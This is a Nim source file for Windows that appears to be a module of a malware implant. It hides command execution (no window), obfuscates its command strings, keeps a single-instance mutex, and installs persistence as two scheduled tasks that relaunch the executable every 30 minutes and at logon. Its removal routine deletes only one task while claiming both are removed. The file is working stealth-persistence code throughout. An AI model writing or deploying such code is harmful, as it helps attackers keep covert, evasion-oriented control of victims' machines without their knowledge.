import std/[os, strutils]
import winim/lean
import obfuscation


var gMutexHandle: HANDLE = 0

proc checkSingleInstance*(mutexName: string): bool =
  let wName = mutexName.newWideCString
  gMutexHandle = CreateMutexW(nil, FALSE, wName)

  if gMutexHandle == 0:
    return false

  if GetLastError() == ERROR_ALREADY_EXISTS:

    CloseHandle(gMutexHandle)
    gMutexHandle = 0
    return false


  return true

proc releaseSingleInstance*() =
  if gMutexHandle != 0:
    ReleaseMutex(gMutexHandle)
    CloseHandle(gMutexHandle)
    gMutexHandle = 0




proc runHidden(cmdLine: string): bool =
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = DWORD(sizeof(STARTUPINFOW))
  si.dwFlags     = STARTF_USESHOWWINDOW
  si.wShowWindow = 0

  var wCmd = cmdLine.newWideCString

  let ok = CreateProcessW(
    nil,
    wCmd,
    nil,
    nil,
    FALSE,
    CREATE_NO_WINDOW,
    nil,
    nil,
    addr si,
    addr pi,
  )

  if ok.bool:
    WaitForSingleObject(pi.hProcess, INFINITE)
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)
    return true

  return false


proc installPersistence*(taskName: string): string =
  let exePath = getAppFilename()


  let cmd30 = (
    s("schtasks.exe /Create /F /TN \"") & taskName &
    s("\" /TR \"") & exePath &
    s("\" /SC MINUTE /MO 30")
  )
  let ok30 = runHidden(cmd30)


  let cmdLogon = (
    s("schtasks.exe /Create /F /TN \"") & taskName & s("_logon") &
    s("\" /TR \"") & exePath &
    s("\" /SC ONLOGON")
  )
  let okLogon = runHidden(cmdLogon)

  if ok30 and okLogon:
    return s("Persistence installed: ") & taskName & s(" (30min + logon)")
  elif ok30:
    return s("Persistence installed: ") & taskName & s(" (30min only)")
  else:
    return s("installPersistence failed: error ") & $GetLastError()

proc removePersistence*(taskName: string): string =
  let cmd30 = s("schtasks.exe /Delete /F /TN \"") & taskName & s("\"")
  let ok30= runHidden(cmd30)
  if ok30:
    return s("Persistence removed: ") & taskName & s(" (both tasks)")
  else:
    return s("removePersistence failed: error ") & $GetLastError()





